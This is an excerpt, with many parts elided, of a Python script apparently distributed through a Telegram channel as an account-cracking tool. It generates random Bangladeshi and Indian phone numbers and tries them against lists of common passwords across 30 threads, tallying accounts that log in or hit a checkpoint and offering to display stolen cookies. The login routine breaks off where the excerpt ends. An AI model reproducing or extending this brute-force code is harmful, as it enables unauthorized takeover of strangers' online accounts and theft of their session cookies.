#-----------------------[ INFO-CODE ]-----------------------#
#OPEN SOURCES BY @ZERO_CYBER_TEM
#Teligerm ID : https://t.me/ZERO_CYBER_TEM
#JONE ALLL
#ENJOY THAT'S 
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
...
#-----------------------[ SC-CODE ]-----------------------#
main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '+88017 | +88018 | +88019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m    [ 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 𝑶𝑵𝑳𝒀 INDIA 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 ]\033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;92m
╠══[𝐶𝑅𝐸𝐴𝑇𝑂𝑅                • \33[1;38mROJOB ALI]\33[1;38m     \033[1;31m                 
╠══[𝑀𝑌 𝐺𝐼𝑇𝐻𝑈𝐵              • \33[1;38mROJOB-ALI 2.0 ]   \33[1;34m                                 
╠══[TELIGERM                 • ❌❌❌] \33[1;35m                                                           
╠══[𝐶O𝑀M𝐴𝑁𝐷                 • 𝑂𝑁𝐿𝑌 𝑀𝐸  ]     \33[1;32m                                                          
╠══[𝑉𝐸𝑅𝑇𝐼𝑂𝑁                • 1.0 ]        \033[1;35m                                                                       
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0;92m
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱"""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
def Main():
    ...
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/rojobali72');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
...
def rndm_bd():
        ...
        with tred(max_workers=30) as Tanim:
                ...
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'iloveyou','i love you','freefire','ilovefreefire','১২৩৪৫৬','১২৩৪৫৬৭৮','১২৩৪৫৬৭৮৯','123456','1234567','12345678','123456789','102030','405060','708090']
...
def rndm_ind():
        ...
        with tred(max_workers=30) as Tanim:
                ...
                for love in user:
                        ids = code + love 
                        pasx = ['iloveyou','i love you','freefire','ilovefreefire','123456','1234567','12345678','123456789','57575751','57273200','59039200',ids,love,ids[3:]]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (ROJOB-Finding) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
